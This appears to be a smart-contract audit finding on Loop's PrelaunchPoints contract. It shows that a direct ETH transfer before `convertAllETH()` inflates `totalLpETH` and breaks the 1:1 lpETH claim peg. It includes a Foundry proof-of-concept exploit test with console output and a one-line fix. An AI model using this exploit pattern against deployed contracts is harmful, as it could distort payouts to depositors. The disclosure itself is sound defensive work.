# Findings Summary

- High : 1

| ID            | Title                                                                     | Severity |
| ------------- | :------------------------------------------------------------------------ | :------: |
| [H-01](#H-01) | Direct ETH transfer to the protocol will break one of its main invariants |   High   |

# Detailed Findings

## <a id='H-01'></a>H-01 Direct ETH transfer to the protocol will break one of its main invariants

## Lines of code

https://github.com/code-423n4/2024-05-loop/blob/0dc8467ccff27230e7c0530b619524cc8401e22a/src/PrelaunchPoints.sol#L321-L322

## Vulnerability details

## Impact

One of the main invariants of the protocol states, "Users that deposit ETH/WETH get the correct amount of lpETH on claim (1 to 1 conversion)." However there is a critial vulnerability and if it is exploited, it would break this invariant, resulting in users not receiving lpETH at the 1:1 peg. Consequently, operations dependent on this invariant, such as determining the rewards from staking lpETH could be affected, calculating the lpETH price which in turn will affect integrating Loopfi with other protocols, because other protocols that accept lpETH as collateral might experience liquidation events and more. This will significantly impair the usability of the protocol.

## Proof of Concept

This vulnerability arises due to the susceptibility of the initial ETH amount that should be deposited to the lpETH contract to manipulation, primarily through the risk of direct ETH transfer by malicious actors to the protocol. Let's examine how this issue can be exploited:

In order to convert all the ETH initially locked by users to lpETH, the contract owner should invoke the `convertAllETH()` function. The balance that should be deposited to lpETH contract is calculated by retrieving the `PrelaunchPoints` contract's balance, which should represent the total ETH deposited by users:

```solidity
  function convertAllETH() external onlyAuthorized onlyBeforeDate(startClaimDate) {
      ...
      // deposits all the ETH to lpETH contract. Receives lpETH back
      uint256 totalBalance = address(this).balance;
      lpETH.deposit{value: totalBalance}(address(this));
      totalLpETH = lpETH.balanceOf(address(this));
      ...
  }

```

However, because this contract can accept direct ETH transfers through its `receive()` function, the calculation of the lpETH deposit amount can be disrupted. A malicious actor can front run the owner before he call `convertAllETH()` and send ETH to the contract, breaking this invariant.

This results in `totalLpETH` being higher than it should be, leading to incorrect calculations wherever it is used. For example, in the `_claim()` function, the amount a user is entitled to claim should be calculated by `(user ETH deposit amount * totalLpETH) / totalSupply`. However, due to this vulnerability, `totalLpETH` will be much higher than `totalSupply`, leading to incorrect calculations of the lpETH user's claim and consequently other issues such as incorrect staking reward amounts. For example in the following function `claimedAmount` will be much higher than it should be

```solidity
 function _claim(address _token, address _receiver, uint8 _percentage, Exchange _exchange, bytes calldata _data)
      internal
      returns (uint256 claimedAmount)
  {
      uint256 userStake = balances[msg.sender][_token];
      if (userStake == 0) {
          revert NothingToClaim();
      }
      if (_token == ETH) {
@>          claimedAmount = userStake.mulDiv(totalLpETH, totalSupply);
          balances[msg.sender][_token] = 0;
          lpETH.safeTransfer(_receiver, claimedAmount);
...
  }
}

```

I've created the following test to visualize the consequences of this bug. It can be simply copied and pasted into `PrelaunchPoints.t.sol`. Additionally, I've developed a helper function to visualize the amount of lpETH that a user is entitled to. This function should be included in `PrelaunchPoints.sol`, it calculates entitlements in the same manner as the `_claim()` function and it is used withing the PoC test:

helper function:

```solidity
  function entiteledTo() external view returns (uint256) {
      uint256 userStake = balances[msg.sender][ETH];
      return userStake.mulDiv(totalLpETH, totalSupply);
  }
```

PoC test:
Run command: `forge test --match-test testDirectETHTransferExploit -vv`

```solidity
  function testDirectETHTransferExploit() public {
      address ALICE = makeAddr("Alice");
      address BOB = makeAddr("Bob");
      address EVE = makeAddr("Eve");

      uint256 lockAmountAlice = 1 ether;
      uint256 lockAmountBob = 2 ether;
      uint256 lockAmountEve = 3 ether;
      vm.deal(ALICE, lockAmountAlice);
      vm.deal(BOB, lockAmountBob);
      vm.deal(EVE, lockAmountEve);

      vm.prank(ALICE);
      prelaunchPoints.lockETH{value: lockAmountAlice}(referral);

      vm.prank(BOB);
      prelaunchPoints.lockETH{value: lockAmountBob}(referral);

      vm.prank(EVE);
      prelaunchPoints.lockETH{value: lockAmountEve}(referral);

      address ATTACKER = makeAddr("Attacker");
      vm.deal(ATTACKER, 10 ether);

      // The attacker sends 10 eth directly to the protocol
      vm.prank(ATTACKER);
      address(prelaunchPoints).call{value: 10 ether}("");

      // Set Loop Contracts and Convert to lpETH
      prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
      vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
      prelaunchPoints.convertAllETH();

      vm.warp(prelaunchPoints.startClaimDate() + 1);

      console.log("Totaly supply: ", prelaunchPoints.totalSupply());
      console.log("Totaly lpETH after exploit: ", prelaunchPoints.totalLpETH());

      // Although Eve deposited only 3 ETH now becuase of the exploit she can claim 8 lpETH
      vm.prank(EVE);
      console.log("Although Eve deposited 3 ETH, she can claim ", prelaunchPoints.entiteledTo(), "lpETH");
  }

```

Console output:

```
Ran 1 test for test/PrelaunchPoints.t.sol:PrelaunchPointsTest
[PASS] testDirectETHTransferExploit() (gas: 299726)
Logs:
Totaly supply:  6000000000000000000
Totaly lpETH after exploit:  16000000000000000000
Although Eve deposited 3 ETH, she can claim  8000000000000000000 lpETH
```

## Tools Used

VSCode, Foundry

## Recommended Mitigation Steps

Since a 1:1 peg with ETH is expected, the calculation of the amount to be deposited to lpETH can be directly retrieved from the `totalSupply` state variable. This variable accurately tracks the amount of ETH deposited by users.

```diff
@@ -318,7 +324,7 @@ contract PrelaunchPoints {
     }

     // deposits all the ETH to lpETH contract. Receives lpETH back
-        uint256 totalBalance = address(this).balance;
+        uint256 totalBalance = totalSupply;
     lpETH.deposit{value: totalBalance}(address(this));
```
